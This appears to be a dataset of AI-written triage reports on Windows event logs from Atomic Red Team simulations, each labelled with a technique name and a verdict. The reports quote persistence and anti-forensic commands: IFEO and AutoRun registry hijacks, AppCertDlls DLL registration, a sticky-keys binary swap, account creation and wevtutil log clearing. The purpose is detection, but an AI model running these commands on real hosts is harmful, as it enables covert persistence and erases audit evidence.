1. **Suspicious PowerShell Activity:** 
   - There are multiple entries indicating the execution of PowerShell commands with the following structure:
     ```
     ""powershell.exe"" & {New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Value 'MSAA AccPropServices',...
     ```
   - This PowerShell command is being used to manipulate the Windows Registry, likely to set up some form of persistence through a COM object. The nature of this manipulation suggests the potential execution of malicious code via the DLL (`T1546.015_calc.dll`) mentioned in the command-line arguments.

2. **Event Logs Clearing:**
   - The security logs indicate that the logs were cleared by `admin_test`:
     - EventID 1102 in the Security log (LogFileCleared).
     - Similar log-clearing events appear in the System logs and are associated with the `wevtutil.exe cl` command to clear event logs.
   - Log clearing can be an indicator of an attempt to cover tracks after a malicious activity.

3. **Persistence Mechanism:**
   - The command `RUNDLL32.EXE` is used with a `-localserver` argument referencing a CLSID. This suggests an attempt to execute or set up a DLL to run with elevated privileges, often a technique used to maintain persistence or execute hidden tasks.

4. **Application Logs:**
   - Events related to Microsoft EdgeUpdate appear normal and usually indicate regular update processes occurring and do not immediately indicate compromise or malicious intent based on the context provided.

1. **Log Clearing**:
   - `Security log`, `System log`, and `Windows PowerShell log` entries indicate logs being cleared by the same user, `admin_test`. Clearing logs unexpectedly can be a method to hide traces of malicious activities.

2. **Suspicious Command Execution**:
   - The Sysmon logs show execution of `""cmd.exe"" /c REG ADD ""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe"" /v Debugger /d ""C:\\Windows\\System32\\cmd.exe""`. This modification of the Windows Image File Execution Options (IFEO) registry key is often used to hijack legitimate processes (in this case, `calc.exe`) to execute other malicious commands or bypass security measures.
   - The existence of `reg.exe` operations reinforcing the registry modification is further discussed, which adds another layer of suspicion.

3. **Process Executions**:
   - Multiple instances of utility executables, like `hostname.exe`, `whoami.exe`, and `wevtutil.exe`, and their spawned `conhost.exe` processes are recorded with high integrity levels. While these applications themselves are not inherently malicious, their frequent use in a short period, coupled with log clearing, suggests script-based or automated malicious activity possibly conducting reconnaissance or tampering with audit logs (`wevtutil cl` indicates clearing Windows event logs).
   
4. **Edge Update Activities**:
   - Numerous process executions related to Microsoft Edge Update tasks seem normal at a glance but could obscure activities if leveraged by malicious actors. The context, however, does not immediately suggest this is directly harmful without further specific details indicating misuse.

5. **Time Discrepancies**:
   - The system log records indicate a time change event. However, this 'time drift' does not necessarily correlate directly to suspicious behavior unless it ties into coordinated attack patterns.

**Assessment**:

- **Threat Level**: **High** due to log clearance, suspicious registry modifications for process hijacking, and coordinated script-like execution of system utilities.
- **Risks Identified**:
  - Potential for persistent backdoor establishment via process hijacking.
  - Evasion tactics preventing detection by clearing logs.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:

- **Immediate Action**:
  - **Isolate the system** to prevent further spread or damage.
  - Conduct a **forensic image** of the current state for detailed analysis.
  - Review the recent activity logs from connected systems and Active Directory to trace potential lateral movement.
  
- **Next Steps**:
  - Revoke or review `admin_test` account privileges and scrutinize for unauthorized accesses.
  - Audit registry keys, especially those under `Image File Execution Options` and monitor for further unauthorized modifications.
  - Validate the integrity of core system binaries and review changes in security group policies.

- **Long-term considerations**:
  - Implement enhanced monitorings, such as setting alerts for log clearance events and registry key changes.
  - Conduct regular training and security awareness updates for privileged users.
  - Assess and reinforce endpoint protection mechanisms, potentially integrating behavioral analysis tools for early threat detection."
HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation),"After analyzing the provided event logs, here are the key points that stand out:

1. **Unusual PowerShell Activity:**
   - The logs show the execution of a PowerShell script with the command:
     ```
     ""powershell.exe"" & { $path = ""HKCU:\Software\Microsoft\Command Processor""; if (!(Test-Path -path $path)){ New-Item -ItemType Key -Path $path }; New-ItemProperty -Path $path -Name ""AutoRun"" -Value ""notepad.exe"" -PropertyType ""String"" }
     ```
   This command modifies the registry key `HKCU:\Software\Microsoft\Command Processor` to set the ""AutoRun"" property to execute `notepad.exe` every time a command prompt is opened. This behavior is suspicious as it can be used for persistence on the system by executing commands every time a command prompt starts.

2. **Log Clearing Activity:**
   - The logs identify that system, Windows PowerShell, and security logs have been cleared by the `admin_test` user.
   - Event IDs 104 (system), 104 (Windows PowerShell), and 1102 (security) are indicative of log clearing actions, which is often a tactic used by attackers to cover their tracks.

3. **High Privilege Operations:**
   - There were several instances of `wevtutil.exe` being used to clear event logs (e.g., “wevtutil.exe cl System”) under a high integrity level, which signifies that the user had administrative privileges to clear logs.

4. **Execution of System Utilities:**
   - The sequence of execution events includes common utilities like `whoami.exe` and `hostname.exe`. Though these are normal Windows utilities, their coordinated execution along with log clearing could be part of reconnaissance or evasive maneuvers.

5. **Integrity Level and Privileges:**
   - All activities logged were executed under high integrity levels with administrative privileges. This suggests actions were carried out with elevated rights.

Given the activities observed, particularly the manipulation of registry for persistence, combined with log clearing, it indicates adversarial behavior consistent with post-exploitation actions. The use of `notepad.exe` in the AutoRun key could be a placeholder or mistake, meaning it might have been swapped with something more malicious in a real attack scenario.

### Conclusion:
Based on the provided logs, the resolution for this situation is **MALICIOUS**. The sequence of activities shows clear indicators of compromise, such as registry manipulation for persistence and log clearance, likely for stealth and evasion purposes.

### Guidance on How to Proceed:
- **Immediate Actions:**
  - Isolate the affected host (Server002) from the network to prevent further spread or change.
  - Conduct a full memory and disk analysis to identify any additional artifacts or persistency mechanisms not visible in the logs.
  - Review other potentially affected systems.

- **Long-term Actions:**
  - Apply patches and review configurations to ensure best practices are employed.
  - Conduct endpoint detection and response (EDR) deployments to enhance monitoring.
  - Provide training on security best practices, focusing on recognizing and preventing malicious activities."
Create a new user in a command prompt,"### Analysis of the Logs

After analyzing the Windows event logs, the following observations and suspicious behaviors were noted:

1. **Event Logs Clearing (Security, System, Windows PowerShell)**
   - **Event ID 1102 (Security Log) and 104 (System and PowerShell Logs):** The logs indicate that the event logs for Security, System, and Windows PowerShell on Server002 were cleared by a user named `admin_test`, SID `S-1-5-21-3962163828-2803415714-1403596700-1006`.
   - Log clearing is a common technique used by attackers to cover their tracks, making this highly suspicious activity.

2. **User Account Manipulation**
   - **Event ID 4720, 4722, 4724, and 4738:** A user account with the username `T1136.001_CMD` was created, enabled, password set, and modified, all in quick succession by `admin_test`.
   - The naming convention `T1136.001_CMD` suggests a reference to a MITRE ATT&CK technique, which is often used as a naming convention by threat actors during simulations or real attacks.

3. **High Privileges and Account Activities**
   - **Event ID 4672:** The user `admin_test` was granted high-privilege privileges that include `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, among others. 
   - Such privileges are typically not required for regular administrative tasks and can indicate an attempt to escalate privileges or perform illicit actions.

4. **Process Execution: Command Line Activities**
   - **Sysmon Event ID 1:** Execution of command-line `cmd.exe` with commands like `/c net user /add ""T1136.001_CMD"" ""T1136.001_CMD!""` suggests the manual addition of the user via command line, further evidencing potentially unauthorized user account creation.
   - **Sysmon Event ID 1 for `wevtutil.exe cl`:** Multiple executions of `wevtutil.exe` indicated clearing of event logs systematically (Application, System, Security), which aligns with the manual log clearance seen in the logs.

5. **Time and Event Manipulation**
   - **Event ID 4616 (Security Log) & Time Manipulation in Kernel Logs:** There are indications of time manipulation events related to system time, possibly indicating an attempt to manipulate time to further confuse logging or bypass timestamp-based detection.

### Assessment

The activities outlined demonstrate clear indicators of malicious behavior, specifically:

- Evidence of log clearing, which is often associated with efforts to obfuscate and hide unauthorized actions on a system.
- Unauthorized user account creation and privilege escalation operations executed potentially through misuse of administrative credentials or by administrative users for illicit purposes.
- High privileges assigned suspiciously, combined with unusual command-line executions, suggest preparations or executions of activities aligned with common unauthorized access or persistence methodologies.

### Recommendation

1. **Resolution: MALICIOUS**
   - This analysis concludes that the events are indicative of malicious activity. The observed behavior is consistent with typical attack vectors involving unauthorized access, privilege escalation, persistence techniques, and anti-forensic measures.

2. **Guidance on How to Proceed:**
   - **Immediate Response**: Isolate the affected machine (Server002) from the network to prevent further potential spread of the compromise.
   - **Forensic Investigation**: Conduct a deep forensic analysis to determine the full scope of the compromise, identify potential data exfiltration, and any other affected systems.
   - **Credential Review and Rotation**: Review and rotate credentials for all user accounts, focusing on accounts used for high-privilege operations.
   - **Review Security Monitoring**: Enhance security monitoring, ensuring all critical logs are centralized to a secure location and cannot be easily tampered with on endpoints.
   - **Remediation and Recovery**: Based on the forensic findings, develop a remediation plan to remove any persistent threats and strengthen defenses to prevent reoccurrence.

Given the evidence and activities observed, escalate this finding to the incident response team for further action and containment."
Replace binary of sticky keys,"The event logs provided indicate several activities on the machine ""Server002"", particularly involving the user ""admin_test"". This analysis will focus on identifying any suspicious or malicious activities based on the provided logs.

### Analysis of Logs

1. **Log Clearance:**
   - Security Log ID 1102: Indicates that security log data has been cleared. The clearing of logs, especially security logs, is often a marker of potentially malicious activity. User ""admin_test"" performed this action, which could suggest an attempt to cover tracks.
   - System Log ID 104: The system log was also cleared by the same user ""admin_test"". Clearing of multiple logs is highly suspicious as it can be indicative of a user attempting to hide their activity.

2. **Execution of `wevtutil`:**
   - Multiple instances of `wevtutil.exe` being executed. This is the Windows Event Log Utility, and the command-line parameters indicate attempts to clear various event logs (e.g., Security, System, Application, Windows PowerShell). This aligns with the log clearance concern and provides further evidence of potential malicious activity.

3. **Suspicious Command Activity:**
   - Sysmon Log ID 1 shows execution of `cmd.exe` with a command to copy and replace `sethc.exe` with `cmd.exe`. This is a well-known privilege escalation technique known as the ""Sticky Keys"" exploit where standard Windows accessibility features are leveraged to gain elevated command prompt access without entering a password at the login screen.

4. **Tool Execution:**
   - The execution of well-known Windows administrative tools like `whoami`, `hostname`, and `conhost` can be seen, typically used to gather system information. These executions themselves are not inherently malicious but, combined with the above activities, could indicate reconnaissance or preparation stages of an attack.

5. **Edge Updates:**
   - Several logs indicate legitimate updates for Microsoft Edge. These logs appear to be routine and are indicative of regular software updates managed by the Edge update service.

### Assessment

The identified activities, particularly the log deletions and the exploitation of the ""Sticky Keys"" vulnerability, strongly indicate malicious intent. The combination of process executions, use of `wevtutil` for log clearing, and command-line activities suggests someone with administrative access is attempting to hide unauthorized activities on the server.

### Resolution

Based on the analysis of logs, the resolution is determined to be **MALICIOUS**. Immediate action is warranted to secure the system and investigate further to identify the extent of the breach.

### Recommendations

1. **Isolate the Host:** Disconnect the machine from the network to prevent further unauthorized activities.
2. **Incident Response:** Initiate a full investigation following the incident response plan, including forensic analysis to identify the source of compromise and any data exfiltration.
3. **Audit Permissions:** Review and restrict administrative permissions, especially the account ""admin_test"" used during these activities.
4. **Patch Management:** Ensure all systems are up-to-date with security patches to protect against known exploits like the ""Sticky Keys"".
5. **Monitoring and Alerting:** Enhance monitoring to detect any similar activities and unauthorized log clearance attempts in the future.

The current findings and insights into the suspicious actions are significant indicators of compromise, necessitating immediate security measures."
Code Executed Via Excel Add-in File (XLL),"### Analysis of Logs

#### 1. System Logs
- **Log Cleared Events**: There are multiple entries indicating the clearing of logs:
  - **Event ID 104** for System and Windows PowerShell logs.
  - These logs were cleared by the user `admin_test`.
  - Clearing logs can be a sign of malicious activity as it might indicate an attempt to cover tracks.

#### 2. Security Logs
- **Event ID 1102**: Security audit logs were cleared by `admin_test`, similar to the System logs.
- **Event ID 4624 and 4672**: These show logon and special privileges assigned to `SYSTEM`. Elevated privileges are normal for system processes but should be contextualized with other activities.
- **Event ID 4798**: Shows querying of user accounts, which is not suspicious in itself, but when combined with log clearing might indicate recon activities.
  
#### 3. Sysmon Logs
- **Multiple wevtutil.exe executions**: The process `wevtutil.exe` is used to clear logs and was executed several times by `admin_test`.
- **Suspicious PowerShell Activity**: A command indicating loading of potentially malicious Excel add-ins. This activity involves:
  - **PowerShell GUID**: dbf410b3-c388-671b-dc00-000000003900
  - Command involves using PowerShell to interact with Excel, potentially malicious:
    ```plaintext
    Powershell.exe & { $excelApp = New-Object -ComObject ""Excel.Application""; $excelApp.RegisterXLL(...) }
    ```
  - This ties in with Atomic Red Team's T1137.006 tactic for Excel add-in abuse.

#### 4. PowerShell Logs
- **Execution Context**: The script executed follows similar patterns to what has been observed in the Sysmon logs, further validating the suspicious nature of the PowerShell command execution.

#### 5. Application Logs
- **Windows Defender**: Security product seems to be working, but no logs indicate any detections at the specific window of observed activities.

### Assessment
The combination of cleared event logs (`System`, `Security`, `Windows PowerShell`), usage of `wevtutil.exe` to clear log files with an unusual PowerShell script execution attempting to load an Excel add-in suggests potential malicious activity. This indicates attempts to persist undetected or execute potentially harmful actions on the system. All activities are executed by user `admin_test`, which suggests compromise or misuse of admin credentials.

### Resolution: MALICIOUS

### Recommendations
1. **Immediate Isolation**: Isolate the affected machine to prevent further spread or exfiltration.
2. **Credentials Reset**: Perform an immediate reset of the `admin_test` credentials and review other privileged accounts for similar misuse.
3. **Conduct a Deep Dive**: Investigate adjacent systems and logs for similar activities to gauge the extent of potential compromise.
4. **Review SIEM Alerts**: Ensure that alerts for suspicious activities such as log clearing and unusual PowerShell usage are properly configured and monitored.
5. **Engage IR Team**: Share findings with your Incident Response team to guide further actions and remediation efforts."
Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell,"Based on the provided Windows event logs, a detailed analysis reveals significant indicators of malicious activity. Below is the breakdown of the findings:

## Analysis of Suspicious Activities:

1. **PowerShell Logging:**
   - A PowerShell script was executed with detailed and suspicious behavior. The script aims to modify the registry to enable access to the VBA project object model, create a scheduled task to open the Calculator application daily, and manipulate Word's normal template (`Normal.dotm`) to include a macro (Event Record ID: 17991).
   - The presence of the PowerShell logging indicates an attempt to leverage the capabilities of Microsoft Office Word for malicious persistence and possibly, macro-based exploitation. The use of `Microsoft.Office.Interop.Word` suggests manipulation of Word via PowerShell automation.

2. **Wevtutil.exe Actions:**
   - `wevtutil.exe` was executed multiple times to clear event logs for different channels, including System and Security logs (Event Record ID: 17975, 17979). Clearing logs is a known anti-forensics tactic, suggesting post-exploitation activity to cover tracks.

3. **Conhost.exe and PowerShell.exe:**
   - The presence of `conhost.exe` is associated with the execution of PowerShell commands, further linking it to suspicious PowerShell activity.

4. **Wevtutil Executions:**
   - Multiple instances of `wevtutil.exe` were executed by the user `admin_test`, indicating attempts to manage or clear event logs (`CommandLine` field includes commands to clear specific event log channels).

5. **Registry and Scheduled Tasks:**
   - The command lines and activities within the logs point towards registry tampering and creation of scheduled tasks, both of which are commonly used for persistence.

6. **Log Clearing Events:**
   - There are several entries indicating log clearing actions (e.g., EventID 1102 in the Security log and EventID 104 in the System log). This is a strong indicator of malicious behavior attempting to hide tracks.

## Threat and Risk Assessment:

The activities outlined above depict a classic attack pattern generally associated with advanced persistence threats:
- **Privilege Misuse:** The actions were executed with high integrity level permissions, indicating privileges misuse.
- **Persistence Techniques:** Use of macros and scheduled tasks for persistence.
- **Anti-Forensics Techniques:** Clearing event logs.

## Resolution:
Given these observed anomalies and activities, this analysis concludes with a resolution of:
- **MALICIOUS** - The logs show clear indicators of compromise through PowerShell script execution for persistence, unauthorized registry changes, event log clearance, and usage of privilege escalation techniques.

## Guidance:
1. **Immediate Containment:** Disconnect the system from the network to prevent further spread or execution of malicious tasks.
2. **In-depth Forensic Analysis:** Conduct a comprehensive forensic investigation to gather further evidence of compromise and identify affected systems.
3. **Review and Audit:** Check configured scheduled tasks, system registries, and any modified files like `Normal.dotm` for unauthorized or malicious changes.
4. **Ensure All Logs Are Backed Up:** Before the above steps, ensure that logs are gathered and stored securely for further analysis.
5. **Incident Response Measures:** Initiate incident response procedures to mitigate any further risks.

Ensure that updated security patches and endpoint protection measures are in place to prevent reoccurrence of such activities."
Simulate Patching termsrv.dll,"Based on the analysis of the provided logs, several indicators suggest potentially malicious activity on the server, specifically related to the user `admin_test`. Here are the key observations:

1. **Use of `PowerShell` with Elevated Privileges:**
   - `PowerShell.exe` was executed with a complex command-line argument that modifies permissions on `C:\Windows\System32\termsrv.dll`, a critical system file.
   - The command changes the ACL (Access Control List) settings to grant ""FullControl"" to ""Administrators"", creates a backup of the DLL, and attempts to modify the original and the backup files. This behavior is alarming because such modifications are often attempts to subvert normal system operations, potentially to create backdoors or enable remote access.

2. **Clearing of Event Logs:**
   - Events show that security and system logs have been cleared (`EventID: 1102`) by the user `admin_test`. This is common practice by malware or an attacker to cover their tracks post-compromise.

3. **Time Change Event:**
   - The system time was altered (`EventID: 4616`). Time changes can be used to manipulate time-based security logs and confuse investigations.

4. **Elevation of Privileges:**
   - Multiple privilege-related events (`EventID: 4672`) show `admin_test` was granted a range of advanced privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, etc. This is necessary for an intruder to perform administrative tasks or escalate privileges to gain greater control over the system.

5. **Frequent Use of `wevtutil.exe`:**
   - There are multiple executions of `wevtutil.exe`, a command-line utility to manage and clear event logs. Together with the log-clearing events, this action signals administrative manipulation of the logs.

Assessing these behaviors collectively, they present a strong case for malicious actions. The combination of log clearing, potential backdoor setup through DLL modification, privilege escalation, and time manipulation indicate a compromise.

**Resolution: MALICIOUS**

### Recommended Actions:

1. **Isolate the affected machine** (Server002) immediately to prevent any further spread of potential malware and remote access.
2. **Conduct a full forensic analysis** of the machine and any timelines related to these events. Determine how and when the entity gained access.
3. **Restore system files and configurations** from known good backups, especially for `termsrv.dll`.
4. **Change all passwords** associated with accounts on the compromised server, notably `admin_test`.
5. **Enhance logging and monitoring** using advanced threat detection solutions to capture and alert on similar behaviors in the future.
6. **Educate staff** on potential signs of compromise and proper cybersecurity practices to prevent future incidents.

It is crucial to address these issues promptly to ensure the security and integrity of the organization's systems and data."
Install and Register Password Filter DLL,"After analyzing the provided Windows event logs, several suspicious and potentially malicious activities were identified:

1. **Log Clearing**: The system and application logs were cleared (Event ID: 104) by the user `admin_test`. The command used for clearing was `wevtutil.exe cl`, directed at multiple channels including System, Windows PowerShell, and Security. Clearing event logs is a common tactic used by malicious actors to cover their tracks.

2. **PowerShell Activity**: There are several PowerShell logs showing the execution of suspicious scripts. These include exporting the registry and modifying system-level registry keys associated with Local Security Authority (LSA). Specifically, the script is manipulating the ""Notification Packages"" registry value and copying a DLL (`AtomicRedTeamPWFilter.dll`) to `C:\Windows\System32`. This behavior matches known techniques for credential dumping or privilege escalation (T1556.002 - Credential API Hooking).

3. **AtomicRedTeam Artifacts**: The presence of the path `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\` and the use of `AtomicRedTeamPWFilter.dll` indicates that Atomic Red Team tests are being executed on the system. Atomic Red Team is a library of open-source security tests that allows security teams to test detection capabilities. However, in a production environment, especially on a CEO's machine, this could indicate unauthorized execution or misuse.

4. **Privilege Escalation**: Several events (Event ID: 4672) show the assignment of high privileges including SeDebugPrivilege and others to the SYSTEM user, which indicates potential privilege escalation activities.

5. **Event Log (Security) Clearing**: Like the System logs, the Security logs were also cleared (Event ID: 1102). This reinforces the fact that an attempt was made to cover up potentially malicious activities on the system.

Considering these activities, I categorize this as **MALICIOUS**.

**Actions to Take:**
1. **Immediate Isolation**: Isolate the affected system (Server002) to prevent any further potential malicious activity or data exfiltration.
2. **Full Malware Scan**: Conduct a comprehensive malware scan using updated antivirus software to identify and remove any malicious software.
3. **Investigate User Activity**: Check recent activities of the user ""admin_test"" to identify any abnormal access or permission changes.
4. **Review Network Traffic**: Analyze network traffic during the time of these events to identify any suspicious connections or data transfer.
5. **Restore Logs**: If possible, restore the logs from a backup to understand the sequence of events leading up to this incident.
6. **Incident Response**: Engage the incident response team to conduct a thorough investigation and implement additional security measures.

In conclusion, the evidence strongly suggests malicious intent, possibly for credential access or privilege escalation purposes. Further investigation is necessary to confirm and remediate fully."
Application Shim Installation,"Upon reviewing the provided Windows event logs, the following observations can be made:

1. **Log File Clearance:**
   - There are multiple instances of event logs being cleared or attempted to be cleared (Event ID 104 and 1102). Specifically, logs for System, Windows PowerShell, and Security channels have been cleared by the user 'SERVER002\admin_test'. This behavior is often indicative of malicious activity as attackers often clear logs to cover their tracks.

2. **Suspicious Command-Line Executions:**
   - The execution of `wevtutil.exe` with the `cl` flag to clear event logs is noted in the Sysmon logs. This is confirmed by multiple `EventID 1` entries showing executions like:
     ```
     ""C:\\Windows\\system32\\wevtutil.exe"" cl ""Microsoft-Windows-Sysmon/Operational""
     ""C:\\Windows\\system32\\wevtutil.exe"" cl ""System""
     ""C:\\Windows\\system32\\wevtutil.exe"" cl ""Security""
     ```
   - These entries indicate that the logs were cleared intentionally in a programmatic fashion rather than as part of regular maintenance or by legitimate software or system activity.

3. **Execution of PowerShell:**
   - PowerShell, known for its wide capabilities and flexibility, was run by 'SERVER002\admin_test'. While the logs do not provide details on the commands executed, the usage of PowerShell, especially when combined with the actions mentioned, can signify malicious activities.

4. **Use of Known Malicious Techniques:**
   - The `cmd.exe` was used to execute `sdbinst.exe`, pointing to a .sdb file located at ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1546.011\\bin\\AtomicShimx86.sdb"". This suggests the potential use of the Application Shim Persistence technique (T1546.011), which is used for persistence or privilege escalation. The presence of “AtomicRedTeam” might imply the use of a penetration testing or offensive security framework designed to test the security posture, or it could indicate malicious use of public malware testing tools.

5. **Processes Executed with High Privileges:**
   - Multiple processes, including those considered utility tools like `wevtutil.exe` and PowerShell, were executed at a high integrity level by 'SERVER002\admin_test'. This, combined with the context of other suspicious activities, amplifies the risk level.

**Assessment:**
The combination of log clearance, suspicious PowerShell execution, and the use of known attack techniques (i.e., Application Shim Persistence) suggest an intentional attempt to obfuscate or execute potentially malicious actions on the machine.

**Resolution: MALICIOUS**

**Guidance:**
Immediate steps should be taken:
- Investigate and isolate the affected host to prevent further potential compromise.
- Conduct a thorough forensic analysis on the host to determine the extent of the compromise, including which, if any, sensitive data might have been accessed or if threat actors have established persistence.
- Review and strengthen log management policies to prevent unauthorized clearance.
- Initiate an incident response plan to address and recover from the potential compromise.
- Analyze the origin and method of compromise, making sure all access points are secured."
WMI Invoke-CimMethod Start Process,"### Detailed Analysis of Logs

Upon reviewing the provided logs, we can identify several events that warrant further scrutiny:

1. **Event 1102 (Log File Cleared):** 
   - The logs indicate two instances of the clearing of log files:
     - The security log was cleared by the user `SERVER002\admin_test` using the process `wevtutil.exe`.
     - The system log was also cleared by the same user.
   - Clearing of log files, especially the security log, is generally considered suspicious as it can indicate an attempt to cover up malicious activities.

2. **Privilege Escalation:**
   - Event 4672 records the granting of special privileges to the user `admin_test` which includes several high-level privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. While the user `admin_test` may legitimately hold these privileges, combined with the log clearing and other events, this is suspicious.

3. **Unusual Process Execution:**
   - The Sysmon logs show multiple executions of `wevtutil.exe` associated with the user `admin_test`, specifically indicating the clearing of logs (`cl` command-line argument for `wevtutil.exe`). 
   - PowerShell script execution (`powershell.exe`) was observed where a CIM session was created to execute the `calc.exe` process remotely. This behavior is unusual, as it uses explicit credentials (`Administrator`) and could indicate lateral movement attempts.

4. **Suspicious PowerShell Activity:**
   - The execution of PowerShell with embedded scripts to start another process (`calc.exe`) could potentially indicate an attempt to execute payloads or probe the environment. This is particularly important because it utilizes `CIM` sessions, which can be associated with sophisticated attacks.

### Assessment

Based on the analysis, the behavior and events observed in the logs suggest more than routine administrative activity. The systematic clearing of logs, the use of elevated privileges, and the execution of scripts via PowerShell with sensitive data and remote execution capabilities are strongly indicative of malicious activity.

1. **Log Clearing** is often used by attackers to hide traces of their presence or activity.
2. **Use of Elevated Privileges** during potentially suspicious activities suggests an intent to gain broader access or control over the system.
3. **PowerShell Activity** in this context is often associated with advanced persistent threats (APTs) where attackers script operations to maintain persistence, escalate privileges, or laterally move within a network.

### Resolution: Malicious

Due to the accumulation of these highly suspicious activities, the assessment concludes a **MALICIOUS** resolution. The activity recorded demonstrates clear evidence of attempts that likely align with compromise maneuvers.

### Guidance on How to Proceed

- **Immediate Actions:**
  - Isolate the affected system (`Server002`) to prevent any further malicious activity from spreading.
  - Perform a forensic investigation on the system to recover possible artifacts erased by log clearing.
  - Change credentials for any admin accounts that were used during this window of potentially malicious activity.
  
- **Prevention and Remediation:**
  - Implement stricter monitor and alert settings for events related to log clearing and the use of `wevtutil.exe`.
  - Enhance monitoring for abnormal PowerShell activity, especially when involving explicit credential usage.
  - Review system and network security policies, focusing on privilege management and logging requirements.
  - Engage with cybersecurity incident response teams to analyze potential breaches and remediate any security flaws used by the attacker.

The above steps are necessary to contain the identified threat and strengthen future security posture."
Create registry persistence via AppCert DLL,"Based on the provided event logs, there are certain activities and patterns that stand out as suspicious and potentially malicious:

1. **Use of PowerShell with Suspicious Commands:**
   - In the Sysmon logs, an instance of PowerShell is seen executing with a significant and alarming command: `""powershell.exe"" & {Copy-Item \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1546.009\\bin\\AtomicTest.dll\"" C:\\Users\\Public\\AtomicTest.dll -Force, reg add \""HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\"" /v \""AtomicTest\"" /t REG_EXPAND_SZ /d \""C:\\Users\\Public\\AtomicTest.dll\"" /f, if($false){Restart-Computer}}`.
   - This command involves copying a DLL file named `AtomicTest.dll` to a public directory and adding it to a registry path related to application certification DLLs, which is commonly associated with privilege escalation and persistence mechanisms. Moreover, the use of `AppCertDlls` for injecting DLLs indicates an advanced persistence technique that can compromise further processes.

2. **Clearing Event Logs:**
   - The security and system logs show logs being cleared by the user `admin_test` around the same time these suspicious PowerShell activities are executed, which is a common technique attackers use to cover their tracks after performing malicious actions.
   - This behavior is evident as logs of Security (EventID 1102) and System logs (EventID 104) show events being cleared immediately after the PowerShell scripted activity.

3. **Registry Manipulation:**
   - The detailed Sysmon events show modifications to the registry that could allow backdoor or stealth access through manipulated AppCertDlls entries.

4. **Frequent Process Initiation and Use of High Integrity Level:**
   - There are multiple instances of wevtutil.exe and conhost.exe being executed with a high integrity level by the same user account within the same timestamp framework, which indicates potential use of legitimate tools to carry out administrative tasks or file execution possibly in a stealthy and unauthorized manner.

5. **Presence of Tools and Indicators Linked to ""Atomic Red Team"":**
   - The path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\` suggests that tools or techniques associated with Atomic Red Team's testing scripts or mimicked attack scenarios are in play which are often used to emulate attacker behavior for testing of defenses. This however could mean either active exploitation or a benign testing activity hence needs validation.

Given these observations, the activity identified in the logs is concerning and indicative of an advanced intrusion attempt or at the very least, an unauthorized security assessment (without formal approval, this is considered suspicious). The key characteristics of potential compromise include the clearing of logs post suspicious commands, manipulation of persistence-related registry keys, and signs of privilege escalation attempts.

**Resolution: SUSPICIOUS**

**Threats/Risks Identified:**
- Unauthorized registry changes indicating potential persistence mechanisms.
- Event log clearing to obstruct forensic analysis and hide activities.
- Use of PowerShell to run commands that suggest the deployment of potentially malicious binaries.

**Guidance on How to Proceed:**
1. **Immediate Investigation:** Conduct a thorough investigation focusing on any changes made to `AppCertDlls` registry keys and the copied `AtomicTest.dll`. Validate if the activities were approved internal security tests or malicious outsider attempts.
   
2. **Containment:** If confirmed as unauthorized, isolate the affected system to prevent potential lateral movement and further network compromise.

3. **Detailed Log Analysis:** Ensure enhanced monitoring on the account `admin_test` and other privileged accounts for any anomalous behavior. Re-enable log persistence to avoid further deletions and gaps in audit trails.

4. **Review Security Policies and User Roles:** Check if proper change control procedures and role-based access are enforced to prevent unauthorized executions from administrative accounts.

5. **Memory and File Analysis:** Collect any in-memory artifacts and analyze suspicious files for further insight using malware analysis tools to confirm if they pose a threat.

By treating the activity as suspicious, further investigation will enable a more accurate classification while maintaining vigilance against potential harm."
Persistence via WMI Event Subscription - CommandLineEventConsumer,"After analyzing the provided logs, I have identified several key events that indicate potential malicious activity or at least warrant further investigation. Below is a detailed assessment:

### Suspicious/Anomalous Behaviors:

1. **Log Clearing Events**:
   - Multiple logs, including the System, Windows PowerShell, and Security logs, were cleared by the user `admin_test`. This activity is suspicious as log clearing can be indicative of an attempt to cover tracks following unauthorized or malicious actions.
   - Events indicating log clearing:
     - **Event ID 104** in the System log for ""System"" and ""Windows PowerShell"".
     - **Event ID 1102** in the Security log.

2. **Unusual PowerShell Activity**:
   - The PowerShell logs reveal execution of a script that references ""AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example"".
   - This appears to set up a WMI Event Consumer for persistence, which is a technique commonly used by attackers.
   - PowerShell Event IDs 600 and 400 contain the suspicious command.

3. **Execution of Potentially Abnormal Commands**:
   - Use of `wevtutil.exe` to clear logs, as seen in the Sysmon logs, supports the abnormal behavior noted in the log clearing events.
   - Multiple instances of the `whoami.exe` and `hostname.exe` executed under the `admin_test` user. While these commands can be part of legitimate administrative tasks, their presence can also be indicative of reconnaissance activities performed by an attacker trying to gather information about the system.

### Indicators of Malicious Activity:
- The log clearing, PowerShell WMI persistence setup, and the use of wevtutil to clear logs are all indicators of potential malicious activity or compromise. These actions can be commonly seen in a compromised environment where an attacker tries to maintain persistence and cover their tracks.

### Resolution:
- **MALICIOUS**: Based on the indicators present, the events can be confidently categorized as malicious due to the log clearing behavior by `admin_test` user, attempted WMI persistence setup via PowerShell, and use of wevtutil to clear event logs.

### Guidance on How to Proceed:
1. **Immediate Response**:
   - Isolate the affected system (Server002) from the network to prevent any potential lateral movement or data exfiltration.
   - Rebooting the system should be avoided to preserve volatile data for forensic analysis.

2. **Investigation**:
   - Conduct a thorough forensic investigation of the system to identify the entry point and scope of the compromise.
   - Analyze any network connections established from or to this machine during the suspicious timeframe.

3. **Containment and Eradication**:
   - Review and reset all credentials that may be affected, especially the `admin_test` account.
   - Remove any scripts, services, or configurations added by the attacker (e.g., WMI Event Consumers).

4. **Recovery and Lessons Learned**:
   - Restore the system from a clean, verified backup, if available.
   - Implement enhanced monitoring and logging mechanisms to quickly detect similar attacks in the future.
